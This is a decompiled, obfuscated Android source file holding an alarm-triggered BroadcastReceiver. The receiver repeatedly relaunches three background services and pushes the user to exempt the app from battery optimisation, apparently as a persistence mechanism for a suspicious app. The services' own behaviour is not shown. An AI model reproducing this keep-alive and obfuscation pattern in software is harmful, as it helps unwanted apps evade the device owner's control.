package wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.PowerManager;
import wocwvy.czyxoxmbauu.slsa.C0034b;
import wocwvy.czyxoxmbauu.slsa.jtfxlnc;
import wocwvy.czyxoxmbauu.slsa.kldqwysgkfcrmq;
import wocwvy.czyxoxmbauu.slsa.ukhakhcgifofl;

public class hwfe extends BroadcastReceiver {

    /* renamed from: a */
    C0034b f566a = new C0034b();

    /* access modifiers changed from: 0000 */
    /* renamed from: a */
    public void mo441a(Context context, Intent intent) {
        C0034b bVar;
        StringBuilder sb;
        String str;
        if (!this.f566a.mo214a()) {
            this.f566a.mo213a("ALARM", "START");
            if (VERSION.SDK_INT < 26) {
                try {
                    context.startService(new Intent(context, ukhakhcgifofl.class));
                } catch (Exception e) {
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append("ALARM 1 ");
                    sb2.append(e);
                    this.f566a.mo213a("Error", sb2.toString());
                }
                try {
                    context.startService(new Intent(context, kldqwysgkfcrmq.class));
                } catch (Exception e2) {
                    StringBuilder sb3 = new StringBuilder();
                    sb3.append("ALARM 2 ");
                    sb3.append(e2);
                    this.f566a.mo213a("Error", sb3.toString());
                }
                try {
                    if (!this.f566a.mo215a(context, jtfxlnc.class)) {
                        context.startService(new Intent(context, jtfxlnc.class));
                    }
                } catch (Exception e3) {
                    e = e3;
                    bVar = this.f566a;
                    str = "Error";
                    sb = new StringBuilder();
                    sb.append("ALARM 3 ");
                    sb.append(e);
                    bVar.mo213a(str, sb.toString());
                }
            } else if (!((PowerManager) context.getSystemService("power")).isIgnoringBatteryOptimizations(context.getPackageName())) {
                StringBuilder sb4 = new StringBuilder();
                sb4.append("package:");
                sb4.append(context.getPackageName());
                context.startActivity(new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS", Uri.parse(sb4.toString())));
            } else {
                try {
                    context.startService(new Intent(context, ukhakhcgifofl.class));
                } catch (Exception e4) {
                    StringBuilder sb5 = new StringBuilder();
                    sb5.append("ALARM 1 ");
                    sb5.append(e4);
                    this.f566a.mo213a("Error", sb5.toString());
                }
                try {
                    context.startService(new Intent(context, kldqwysgkfcrmq.class));
                } catch (Exception e5) {
                    StringBuilder sb6 = new StringBuilder();
                    sb6.append("ALARM 2 ");
                    sb6.append(e5);
                    this.f566a.mo213a("Error", sb6.toString());
                }
                try {
                    if (!this.f566a.mo215a(context, jtfxlnc.class)) {
                        context.startService(new Intent(context, jtfxlnc.class));
                    }
                } catch (Exception e6) {
                    e = e6;
                    bVar = this.f566a;
                    str = "Error";
                    sb = new StringBuilder();
                    sb.append("ALARM 3 ");
                    sb.append(e);
                    bVar.mo213a(str, sb.toString());
                }
            }
        }
    }

    public void onReceive(Context context, Intent intent) {
        mo441a(context, intent);
    }
}
